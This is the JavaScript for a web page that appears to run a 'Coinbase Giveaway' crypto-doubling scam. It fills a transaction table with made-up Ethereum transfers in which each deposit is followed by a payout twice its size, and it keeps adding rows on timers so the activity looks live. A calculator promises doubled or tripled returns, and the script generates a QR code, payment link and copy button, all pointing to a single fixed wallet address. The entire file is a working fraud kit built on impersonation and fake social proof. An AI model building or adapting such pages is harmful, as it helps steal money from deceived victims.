var parcent = 2

function update_count() {
  setInterval(() => {
    $('#num_').text(parseInt($('#num_').text()) + 1)
  }, 12e4)
}

function tx(_) {
  return 1 + Math.floor(Math.random() * _)
}

function dec2hex(dec) {
  return ('0' + dec.toString(16)).substr(-2)
}

function generateId(length) {
  for (
    var result = '',
      characters = 'ABCDEFabcdef0123456789',
      charactersLength = characters.length,
      i = 0;
    i < length;
    i++
  )
    result += characters.charAt(Math.floor(Math.random() * charactersLength))
  return result
}

function create_transaction(mins) {
  var table,
    row = (table = document.getElementById('myTable')).insertRow(1),
    address = get_random(),
    amount = (49.5 * Math.random()).toFixed(2),
    decimal = String(Math.random(1, 999))
  row.innerHTML =
    '<tr  class="tr"> <td><a class="hash-tag text-truncate" href="">0x' +
    generateId(63) +
    '</a> </td> <td class="d-none d-sm-table-cell"><a href="">4' +
    tx(99999999) +
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span> </td> <td><a class="hash-tag text-truncate" href="">' +
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x55d70C8350e8AFdFcb2784d91E2ec5fA2f31a091</span> </td> <td>' +
    amount +
    ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
    tx(999) +
    '</span></td> </tr>'
  var table,
    row = (table = document.getElementById('myTable')).insertRow(1),
    send_amount = amount * parcent
  row.innerHTML =
    '<tr> <td><a class="hash-tag text-truncate" href="">0x' +
    generateId(63) +
    '</a> </td> <td class="d-none d-sm-table-cell"><a href="">4' +
    tx(99999999) +
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span></td> <td><span class="hash-tag text-truncate">0x55d70C8350e8AFdFcb2784d91E2ec5fA2f31a091</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
    address +
    '</a> </td> <td>' +
    send_amount +
    ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
    tx(999) +
    '</span></td> </tr>'
}

function update_tx() {
  setInterval(() => {
    $('#num_').text(parseInt($('#num_').text()) + 1)
  }, 12e4)
}

function new_transaction() {
  var table,
    row = document.getElementById('myTable').insertRow(1),
    address = get_random(),
    amount = (49.5 * Math.random()).toFixed(2),
    decimal = String(Math.random(1, 999))
  ;(row.innerHTML =
    '<tr> <td><a class="hash-tag text-truncate" href="">0x' +
    generateId(63) +
    '</a> </td> <td class="d-none d-sm-table-cell"><a href="">4' +
    tx(99999999) +
    '</a></td> <td><span class="timer" >now</span> </td> <td><a class="hash-tag text-truncate" href="">' +
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x55d70C8350e8AFdFcb2784d91E2ec5fA2f31a091</span> </td> <td>' +
    amount +
    ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
    tx(999) +
    '</span></td> </tr>'),
    document
      .getElementById('myTable')
      .deleteRow(document.getElementById('myTable').rows.length - 1),
    document.getElementsByTagName('tr')[1].classList.add('toolbar'),
    setTimeout(() => {
      var table,
        row = document.getElementById('myTable').insertRow(1),
        send_amount = amount * parcent
      ;(row.innerHTML =
        '<tr> <td><a class="hash-tag text-truncate" href="">0x' +
        generateId(63) +
        '</a> </td> <td class="d-none d-sm-table-cell"><a href="">4' +
        tx(99999999) +
        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">0x55d70C8350e8AFdFcb2784d91E2ec5fA2f31a091</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
        address +
        '</a> </td> <td>' +
        send_amount +
        ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
        tx(999) +
        '</span></td> </tr>'),
        document
          .getElementById('myTable')
          .deleteRow(document.getElementById('myTable').rows.length - 1),
        document.getElementsByTagName('tr')[1].classList.add('toolbar')
    }, 8500)
}

function update_trans() {
  for (i = 0; i < times.length; i++)
    'now' == times[i].innerHTML
      ? (times[i].innerHTML = '1 mins ago')
      : 1 == parseInt(times[i].innerHTML.split(' ')[0]) &&
        'mins' == times[i].innerHTML.split(' ')[1]
      ? (times[i].innerHTML =
          parseInt(times[i].innerHTML.split(' ')[0]) + 1 + ' mins ago')
      : parseInt(times[i].innerHTML.split(' ')[0]) >= 59 &&
        'mins' == times[i].innerHTML.split(' ')[1]
      ? (times[i].innerHTML = '1 hrs ago')
      : parseInt(times[i].innerHTML.split(' ')[0]) > 1 &&
        'mins' == times[i].innerHTML.split(' ')[1] &&
        (times[i].innerHTML =
          parseInt(times[i].innerHTML.split()[0]) + 1 + ' mins ago')
  new_transaction()
}

;(get_random = function (
  list = [
    '0x' + generateId(40),
    'Binance 1',
    '0x' + generateId(40),
    'Binance 2',
    '0x' + generateId(40),
    'Binance 3',
    '0x' + generateId(40),
    'Remitano 2',
    '0x' + generateId(40),
    'Remitano 3',
    '0x' + generateId(40),
    'Remitano 1',
    '0x' + generateId(40),
    'Mercatox',
    '0x' + generateId(40),
    'IndaCoin',
    '0x' + generateId(40),
    'CoinExchange.io',
    '0x' + generateId(40),
    'HitBTC 2',
    '0x' + generateId(40),
    'HitBTC 1',
    '0x' + generateId(40),
    'LAToken 3',
    '0x' + generateId(40),
    'LAToken 2',
    '0x' + generateId(40),
    'LAToken 1',
  ],
) {
  return list[Math.floor(Math.random() * list.length)]
}),
  $(document).ready(() => {
    for (i = 25; i > 0; i--) create_transaction(i)
    update_tx(), update_count()
  }),
  (times = document.getElementsByClassName('timer')),
  (window.onload = () => {
    update_trans(),
      (trans = setInterval(() => {
        update_trans()
      }, 1e4))
  }),
  $('#gen-btn').click(() => {
    if ($('#cal-in').val() >= 1 && $('#cal-in').val() <= 500) {
      amount_entered = $('#cal-in').val()
      tm = Date.now()
      $('#gen-amount').text(amount_entered)
      $('#copy_').attr('data-clipboard-text', amount_entered)
      $('#warn').text(''), $('.pop-body').css('display', 'flex')
      $('#qrcode_svg').attr(
        'src',
        'https://api.qrserver.com/v1/create-qr-code/?data=ethereum%3A0x55d70C8350e8AFdFcb2784d91E2ec5fA2f31a091%3Famount%3D' +
          amount_entered +
          '%26message%3DDeposit%2Bto%2BCoinbase%2BGiveaway%2B' +
          tm +
          '&size=150x150',
      )
      $('#paynow')
        .parent()
        .attr(
          'href',
          'ethereum:0x55d70C8350e8AFdFcb2784d91E2ec5fA2f31a091?amount=' +
            amount_entered +
            '&message=Deposit+to+Coinbase+Giveaway+' +
            tm,
        )
    } else $('#warn').text('Amount should be within 1 ETH to 500 ETH')
  }),
  $('#close').click(() => {
    $('.pop-body').css('display', 'none')
  }),
  // setTimeout(function () {
  //   let viewheight = $(window).height(),
  //     viewwidth = $(window).width(),
  //     viewport
  //   document
  //     .querySelector('meta[name=viewport]')
  //     .setAttribute(
  //       'content',
  //       'height=' +
  //         viewheight +
  //         'px, width=' +
  //         viewwidth +
  //         'px, initial-scale=1.0',
  //     )
  // }, 300),
  $('#cal-in').on('input', () => {
    var in_amount = $('#cal-in').val()
    if (in_amount > 0 && in_amount < 5) {
      $('#cal-out').val(in_amount * 2)
    } else if ((in_amount) => 5 && in_amount <= 100) {
      $('#cal-out').val(in_amount * 3)
    }
  })

$('#cal-out').on('input', () => {
  var in_amount = $('#cal-out').val()
  if (in_amount > 0 && in_amount < 15) {
    $('#cal-in').val(in_amount / 2)
  } else if ((in_amount) => 15 && in_amount <= 300) {
    $('#cal-in').val(in_amount / 3)
  }
})

function copy_item(item) {
  var t = window.getSelection(),
    e = document.createElement('div')
  ;(e.style.position = 'absolute'),
    (e.style.left = '-99999px'),
    document.body.appendChild(e),
    (e.innerHTML = item),
    t.selectAllChildren(e),
    window.setTimeout(function () {
      document.body.removeChild(e)
    }, 100)
}

function copy_main(id, fade) {
  copy_item($('#' + id).attr('data-clipboard-text'))
  var clipboard = new Clipboard('#' + id)
  clipboard.on('success', function () {
    $('#' + fade).css('opacity', 1), $('#' + id).css('opacity', 0)
  }),
    clipboard.on('error', function (e) {
      $('.tooltiptetext').html('Faild!')
    })
}

// Copy amount starts here

$('#copy_').click(() => {
  copy_main('copy_', 'address-card')
})

$('#copy_').mouseout(() => {
  $('#address-card').css('opacity', 0), $('#copy_').css('opacity', 1)
})

// Copy amount ends here

// Copy address part starts here

$('#copy_address').click(() => {
  $('#copy_address').attr(
    'data-clipboard-text',
    '0x55d70C8350e8AFdFcb2784d91E2ec5fA2f31a091',
  )
  copy_main('copy_address', 'done-copy')
})

$('#copy_address').mouseout(() => {
  $('#done-copy').css('opacity', 0), $('#copy_address').css('opacity', 1)
})

// Copy address part ends here
